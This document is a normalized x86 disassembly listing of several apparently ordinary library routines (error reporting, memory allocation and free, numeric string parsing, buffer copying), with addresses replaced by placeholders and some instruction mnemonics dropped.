jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
add esp 0x8
retn
add esp 0x8
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002fef0
mov eax 0x8
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
lea edx [ esp ]
mov ecx eax
push edx
shr ecx 0xc
and ecx 0xfff
shr eax 0x18
shl ecx 0xc
shl eax 0x18
or ecx eax
mov eax [ rw-data ]
mov [ esp + 0x4 ] ecx
call [ eax + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
add esp 0x8
retn
add esp 0x8
retn
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
sub_1002ff80
mov eax 0x8
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
push esi
mov esi eax
mov ecx [ rw-data ]
and esi 0xfff
shr eax 0x18
and esi 0xfff
shl eax 0x18
or eax esi
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
push eax
call [ ecx + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
pop esi
add esp 0x8
retn
mov eax [ rw-data ]
lea edx [ esp + 0x4 ]
push edx
mov [ esp + 0x8 ] esi
call [ eax + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
pop esi
add esp 0x8
retn
sub_10030030
mov eax [ esp + 0x4 ]
push esi
mov esi 0x13
mov eax [ eax ]
mov ecx eax
mov edx eax
and ecx 0xfff000
shr edx 0xc
xor ecx edx
xor edx edx
shr ecx 0xc
xor ecx eax
mov eax ecx
div esi
pop esi
lea eax [ edx + edx * 2 ]
lea eax [ edx + eax * 4 ]
xor eax ecx
retn
sub_10030080
mov eax 0x190
call sub_1001d0d0
mov eax [ rw-data ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
jne r-xdata
call sub_1001f590
mov ecx [ rw-data ]
mov esi eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] esi
push eax
call [ ecx + 0x1c ]
mov edi eax
add esp 0x4
cmp edi ebp
jne r-xdata
push 0xd7
push r--data
push 0x1
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
cmp eax ebp
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x190
retn
push 0x275
push r--data
push 0x18c
call sub_1001d4c0
mov edi eax
add esp 0xc
cmp edi ebp
jne r-xdata
push 0xda
push r--data
push 0x1
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] r--data
mov [ edi ] esi
mov [ edi + 0x184 ] ebp
mov [ edi + 0x188 ] ebp
lea eax [ edi + 0xc4 ]
mov ecx 0x10
pop edi
pop esi
pop ebp
mov eax rw-data
pop ebx
add esp 0x190
retn
mov [ eax - 0x40 ] ebp
mov [ eax ] ebp
add eax 0x4
dec ecx
jne r-xdata
mov edx [ rw-data ]
push edi
call [ edx + 0x20 ]
mov esi eax
mov eax [ rw-data ]
push edi
mov [ esp + 0x18 ] esi
call [ eax + 0x1c ]
add esp 0x8
cmp eax edi
je r-xdata
cmp esi ebp
je r-xdata
lea esi [ edi + 0x84 ]
mov ebx 0x10
add esi 0x84
mov ebx 0x10
mov [ esi + 0x40 ] ebp
add esi 0x4
dec ebx
jne r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov [ esi + 0x40 ] ebp
add esi 0x4
dec ebx
jne r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi ]
cmp eax ebp
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov eax rw-data
pop edi
pop esi
pop ebp
pop ebx
add esp 0x190
retn
push eax
call sub_1001d740
add esp 0x4
mov [ esi ] ebp
mov eax [ esi ]
cmp eax ebp
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
mov [ esi ] ebp
sub_10030200
mov eax 0x2c
call sub_1001d0d0
mov ecx [ esp + 0x3c ]
push ebx
xor ebx ebx
push ebp
push esi
cmp ecx ebx
push edi
mov [ esp + 0x14 ] ebx
lea ebp [ esp + 0x24 ]
mov [ esp + 0x20 ] 0x18
mov [ esp + 0x10 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2c
retn
mov edx [ esp + 0x48 ]
cmp ecx 0xffffffff
jne r-xdata
movsx eax [ edx ]
dec ecx
cmp eax 0x30
lea esi [ edx + 0x1 ]
jl r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x4c ] ecx
push 0x6d
push r--data
push 0x7a
push 0x64
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
cmp eax 0x32
jg r-xdata
lea edx [ eax - 0x30 ]
cmp ecx ebx
mov [ esp + 0x18 ] edx
jg r-xdata
movsx eax [ esi ]
inc esi
dec ecx
cmp ecx ebx
mov [ esp + 0x48 ] eax
mov [ esp + 0x1c ] esi
mov [ esp + 0x4c ] ecx
jle r-xdata
push 0x73
push r--data
push 0x8a
push 0x64
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
jmp r-xdata
cmp eax 0x2e
je r-xdata
xor ebx ebx
xor edi edi
test ecx ecx
jle r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov esi [ esp + 0x1c ]
dec ecx
mov [ esp + 0x4c ] ecx
movsx eax [ esi ]
inc esi
cmp eax 0x20
mov [ esp + 0x48 ] eax
mov [ esp + 0x1c ] esi
je r-xdata
push 0x7d
push r--data
push 0x83
xor esi esi
test edi edi
je r-xdata
cmp edx 0x2
jge r-xdata
cmp eax 0x2e
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
call sub_1001d740
add esp 0x4
mov cl bl
mov esi 0x1
and cl 0x7f
shr ebx 0x7
mov [ ebp ] cl
je r-xdata
mov ebx [ esp + 0x10 ]
push ebx
call sub_10029870
mov ecx eax
mov eax 0x92492493
add ecx 0x6
add esp 0x4
imul ecx
add edx ecx
mov eax [ esp + 0x20 ]
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
cmp edi eax
jle r-xdata
test edi edi
je r-xdata
cmp ebx 0x28
jae r-xdata
mov esi eax
cmp esi 0x30
jl r-xdata
push eax
call sub_10029950
add esp 0x4
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov dl bl
and dl 0x7f
mov [ esi + ebp ] dl
inc esi
shr ebx 0x7
jne r-xdata
mov eax edi
dec edi
test eax eax
je r-xdata
lea edx [ esp + 0x24 ]
cmp ebp edx
je r-xdata
lea eax [ edx + edx * 4 ]
lea ebx [ ebx + eax * 8 ]
lea ecx [ edx + edx * 4 ]
mov edx [ esp + 0x10 ]
shl ecx 0x3
push ecx
push edx
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
push 0xa3
push r--data
push 0x93
jmp r-xdata
push 0x8b
push r--data
push 0x82
jmp r-xdata
cmp esi 0x39
jg r-xdata
add eax esi
mov edi [ esp + 0x44 ]
lea edx [ esi + eax ]
cmp edx edi
jg r-xdata
inc edi
lea eax [ edi + 0x20 ]
push 0xb9
push r--data
push eax
mov [ esp + 0x2c ] eax
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
push ebp
call sub_1001d740
add esp 0x4
lea ecx [ esp + 0x24 ]
cmp ebp ecx
je r-xdata
jmp r-xdata
push 0x64
push 0xd
call sub_1001de60
add esp 0x14
test edi edi
jne r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
cmp ebp eax
je r-xdata
push 0xcf
push r--data
push 0x6b
jmp r-xdata
dec esi
test esi esi
jle r-xdata
push 0x80
push ebx
call sub_10035a60
add esp 0x8
mov [ esi + ebp ] al
inc esi
dec edi
jne r-xdata
jmp r-xdata
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
push 0xa
push ecx
call sub_10035cb0
add esp 0x8
test eax eax
je r-xdata
cmp ebx 0x19999999
jbe r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
call sub_1001d740
add esp 0x4
mov dl [ ebp ]
mov [ eax + ecx ] dl
inc eax
jmp r-xdata
mov dl [ esi + ebp ]
or dl 0x80
mov [ eax + ecx ] dl
inc eax
dec esi
test esi esi
jg r-xdata
mov edx [ esp + 0x10 ]
add esi 0xffffffd0
push esi
push edx
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
mov eax [ esp + 0x10 ]
mov edi 0x1
test eax eax
jne r-xdata
push eax
call sub_10029950
add esp 0x4
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4c ]
test eax eax
jg r-xdata
mov ecx [ esp + 0x4c ]
jmp r-xdata
mov eax [ esp + 0x10 ]
push ebx
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov edx [ esp + 0x18 ]
test ecx ecx
jg r-xdata
sub_100305b0
mov eax 0x50
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x60 ]
push esi
test ebp ebp
push edi
lea esi [ esp + 0x10 ]
je r-xdata
push 0x4
push r--data
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x0
push ebp
lea eax [ esp + 0x18 ]
push 0x50
push eax
call sub_10022e40
mov edi eax
add esp 0x10
cmp edi 0x4f
jle r-xdata
test edi edi
jg r-xdata
lea ebx [ edi + 0x1 ]
push 0xf5
push r--data
push ebx
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edx [ esp + 0x64 ]
push edi
push esi
push edx
call sub_100209d0
lea eax [ esp + 0x1c ]
add esp 0xc
cmp esi eax
je r-xdata
push 0x9
push r--data
jmp r-xdata
push 0x0
push ebp
push ebx
push esi
call sub_10022e40
add esp 0x10
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x50
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x6c ]
push ecx
call sub_100209d0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
sub_10030680
mov eax 0x8
call sub_1001d0d0
mov ecx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
lea edx [ esp + 0x8 ]
push ecx
push edx
mov eax [ esi ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_1002e880
add esp 0x14
test al 0x80
je r-xdata
cmp [ esp + 0x18 ] 0x6
je r-xdata
mov eax 0x66
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push edx
call sub_10030720
add esp 0xc
test eax eax
je r-xdata
mov eax 0x74
push 0x11b
push r--data
push eax
push 0x93
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
add esp 0x8
retn
pop esi
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
mov [ esi ] ecx
sub_10030720
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
push 0x14e
push r--data
push 0x18
call sub_1001d4c0
add esp 0xc
cmp eax edi
jne r-xdata
mov ebp [ eax ]
cmp ebp edi
je r-xdata
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x8 ] edi
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x14 ] 0x1
mov ebp eax
push 0x151
push r--data
push 0x41
push 0x7b
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
test [ ebp + 0x14 ] 0x1
jne r-xdata
cmp eax edi
je r-xdata
cmp [ ebp + 0xc ] ebx
jge r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ esp + 0x20 ]
mov esi [ eax ]
mov eax [ ebp + 0x10 ]
cmp eax edi
mov [ esp + 0x10 ] esi
je r-xdata
cmp ebx edi
mov eax ebx
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
mov edi [ ebp + 0x10 ]
mov ecx ebx
mov edx ecx
mov eax [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov [ ebp + 0xc ] ebx
add ecx ebx
mov [ ebp ] 0x0
test eax eax
mov [ ebp + 0x4 ] 0x0
je r-xdata
push 0x134
push r--data
push eax
call sub_1001d4c0
mov edx [ ebp + 0x14 ]
add esp 0xc
or edx 0x8
cmp eax edi
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] edx
jne r-xdata
mov eax 0x1
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ eax ] ecx
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
mov [ eax ] ebp
push 0x144
push r--data
push 0x41
push 0xc4
push 0xd
call sub_1001de60
add esp 0x14
cmp ebp edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x18 ]
cmp eax edi
je r-xdata
test [ ebp + 0x14 ] 0x4
je r-xdata
cmp [ eax ] ebp
je r-xdata
test [ ebp + 0x14 ] 0x8
je r-xdata
mov eax [ ebp ]
cmp eax edi
je r-xdata
test [ ebp + 0x14 ] 0x1
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push ebp
call sub_1001d740
add esp 0x4
mov [ ebp + 0x10 ] edi
mov [ ebp + 0xc ] edi
push eax
call sub_1001d740
add esp 0x4
mov [ ebp + 0x4 ] edi
mov [ ebp ] edi
push eax
call sub_1001d740
add esp 0x4
sub_100308c0
push 0x14e
push r--data
push 0x18
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] 0x1
retn
push 0x151
push r--data
push 0x41
push 0x7b
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10030910
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
test [ esi + 0x14 ] 0x4
je r-xdata
test [ esi + 0x14 ] 0x8
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
test [ esi + 0x14 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
mov [ esi + 0x10 ] 0x0
mov [ esi + 0xc ] 0x0
push eax
call sub_1001d740
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov [ esi ] 0x0
push eax
call sub_1001d740
add esp 0x4
sub_10030980
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
test ebp ebp
push edi
mov [ esp + 0x10 ] 0x0
jne r-xdata
test [ ebp + 0x14 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
call sub_100308c0
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebp + 0xc ]
push 0x52
push r--data
push eax
call sub_1001d4c0
add esp 0xc
mov [ ebx + 0x10 ] eax
test eax eax
je r-xdata
push 0x4f
push r--data
push 0xd
push 0x65
push 0x8
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x6f
push r--data
push 0x41
push 0x65
push 0x8
call sub_1001de60
mov eax [ esp + 0x24 ]
add esp 0x14
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
mov edi [ ebp + 0x4 ]
test edi edi
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push ebx
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
call sub_1001d740
add esp 0x4
mov edi [ ebp ]
test edi edi
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x5d
mov esi ecx
push r--data
inc esi
push esi
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
mov [ ebx + 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
or ecx 0xd
pop esi
mov [ ebx + 0x14 ] ecx
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x67
mov esi ecx
push r--data
inc esi
push esi
call sub_1001d4c0
add esp 0xc
mov [ ebx ] eax
test eax eax
jne r-xdata
mov ecx esi
mov esi [ ebp + 0x4 ]
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx esi
mov esi [ ebp ]
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_10030b10
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx [ edx + 0xc ]
mov edi [ esi + 0xc ]
mov eax ecx
sub eax edi
jne r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x10 ]
mov esi [ edx + 0x10 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
sbb eax eax
sbb eax 0xffffffff
sub_10030b40
mov eax 0x18
call sub_1001d0d0
push esi
mov esi [ esp + 0x24 ]
cmp esi 0xffffffff
jne r-xdata
cmp esi 0x1
jl r-xdata
mov eax 0x1
pop esi
add esp 0x18
retn
mov eax [ rw-data ]
mov [ esp + 0x4 ] esi
test eax eax
je r-xdata
cmp esi 0x7
jg r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
push edx
push eax
push esi
call [ rw-data ]
add esp 0xc
pop esi
add esp 0x18
retn
lea ecx [ esp + 0x4 ]
push ecx
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
lea eax [ esi - 0x1 ]
jmp r-xdata
add eax 0x7
cmp eax 0xffffffff
jne r-xdata
test eax eax
jge r-xdata
cmp eax 0x7
jge r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
add eax 0xfffffff9
push eax
push edx
call sub_1001e7c0
add esp 0x8
lea ecx [ eax + eax * 2 ]
lea eax [ ecx * 8 + rw-data ]
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
push ecx
push edx
push eax
call [ eax + 0x8 ]
add esp 0xc
pop esi
add esp 0x18
retn
sub_10030bf0
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi [ edi + 0x58 ]
test esi esi
je r-xdata
push 0x0
push 0xffffffff
push edi
call sub_10023a40
mov eax [ edi + 0x28 ]
add esp 0xc
not al
and eax 0xff
pop edi
and eax 0x20
pop esi
or al 0x10
shr eax 0x4
retn
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esp + 0xc ]
push ebx
test esi esi
mov ebx [ eax + 0x10 ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ esi ]
push edi
push eax
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
pop ebx
pop edi
mov eax 0x2
pop esi
retn
mov edx [ esi + 0x4 ]
inc edi
push edx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esi ]
inc edi
push ecx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
retn
sub_10030ce0
mov eax [ esp + 0x8 ]
push esi
mov esi [ eax + 0x58 ]
test esi esi
je r-xdata
mov eax 0x3
pop esi
retn
mov ecx [ esp + 0x8 ]
push ebx
push edi
mov ebx [ ecx + 0x10 ]
je r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov edx [ esi + 0x4 ]
push edi
push edx
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
mov ecx [ esi ]
push edi
push ecx
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop ebx
mov eax 0x2
pop esi
retn
mov eax [ esi + 0x4 ]
inc edi
push eax
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop edi
pop ebx
mov eax 0x1
pop esi
retn
mov edx [ esi ]
inc edi
push edx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
retn
sub_10030db0
push esi
mov esi [ esp + 0xc ]
push 0x0
push 0xffffffff
push esi
call sub_10023a40
mov eax [ esi + 0x28 ]
add esp 0xc
not al
and eax 0xff
pop esi
and eax 0x20
or al 0x10
shr eax 0x4
retn
sub_10030de0
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
mov esi [ eax + 0x58 ]
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
retn
mov eax [ esi + 0x4 ]
mov ebx [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ esi ]
push edi
push eax
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
retn
mov edx [ esi + 0x4 ]
inc edi
push edx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov ecx [ esi ]
inc edi
push ecx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
retn
sub_10030ec0
mov eax 0x1c
call sub_1001d0d0
push esi
mov esi [ esp + 0x24 ]
xor eax eax
cmp esi eax
mov [ esp + 0x4 ] eax
jne r-xdata
mov edx [ esp + 0x30 ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x2c ]
push eax
mov [ esp + 0x10 ] al
push eax
mov eax [ esp + 0x38 ]
push 0xffffffff
push edx
push eax
push ecx
push esi
call sub_10030f20
add esp 0x20
test eax eax
jle r-xdata
lea esi [ esp + 0x4 ]
xor eax eax
pop esi
add esp 0x1c
retn
mov eax [ esi ]
pop esi
add esp 0x1c
retn
sub_10030f20
mov eax 0x1c
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x30 ]
push ebp
push esi
mov esi [ esp + 0x2c ]
push edi
mov edi [ ebx + 0x10 ]
xor edx edx
xor ecx ecx
xor ebp ebp
cmp esi edx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] ecx
mov [ esp + 0x3c ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1c
retn
cmp edi edx
je r-xdata
movsx eax [ ebx ]
cmp eax 0x6
mov [ esp + 0x1c ] edx
ja r-xdata
mov eax [ edi + 0x10 ]
cmp eax edx
je r-xdata
jmp [ eax * 4 + jump_table_100316cc ]
mov edx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edi [ esp + 0x4c ]
mov esi [ esp + 0x34 ]
mov edx [ esp + 0x38 ]
push edi
mov ecx [ esi ]
push 0x1
push 0x0
push 0xffffffff
lea eax [ esp + 0x24 ]
push edx
mov [ esp + 0x28 ] ecx
push eax
push 0x0
lea ecx [ esp + 0x60 ]
push 0x0
lea edx [ esp + 0x48 ]
push ecx
push edx
push 0x0
call sub_100323f0
add esp 0x2c
test eax eax
jne r-xdata
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x44 ]
push eax
mov eax [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x40 ]
push edx
push ebx
push eax
push ecx
push esi
call [ edi + 0x10 ]
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov al [ esp + 0x48 ]
mov edi [ esp + 0x40 ]
mov esi [ esp + 0x34 ]
test al al
je r-xdata
test edx edx
je r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x40 ]
cmp eax 0xffffffff
mov edx [ esi ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x38 ]
mov [ esp + 0x3c ] edx
jne r-xdata
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x40 ]
push eax
mov eax [ esp + 0x40 ]
push ecx
push ebx
push edx
push eax
push esi
call sub_10031af0
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
cmp [ esp + 0x40 ] 0xffffffff
jne r-xdata
mov al [ esp + 0x44 ]
test al al
je r-xdata
push 0xd0
push r--data
push 0x3a
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov edx [ esi ]
cmp edi 0xffffffff
mov [ esp + 0x14 ] edx
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push ebx
push esi
push 0x4
call edx
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x44 ]
mov eax 0x10
xor ecx ecx
jmp r-xdata
push 0xbe
push r--data
push 0xaa
jmp r-xdata
mov cl [ esp + 0x48 ]
test cl cl
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jl r-xdata
mov al [ esp + 0x48 ]
test al al
je r-xdata
push 0x78
push 0xd
call sub_1001de60
add esp 0x14
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x24 ]
push ecx
push esi
push edx
call [ eax + 0x8 ]
add esp 0xc
cmp edi 0xffffffff
je r-xdata
mov ebp [ esi ]
test ecx ecx
mov dl [ ebp ]
mov [ esp + 0x3c ] dl
jne r-xdata
mov eax edi
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x34 ]
mov esi [ ebx + 0x8 ]
xor edi edi
mov eax [ edx ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0xc ]
test eax eax
jle r-xdata
push ebx
push esi
call sub_10033160
add esp 0x8
test eax eax
jne r-xdata
push 0x204
push r--data
push 0x64
cmp eax 0xffffffff
jne r-xdata
push 0x17c
push r--data
push 0x3a
jmp r-xdata
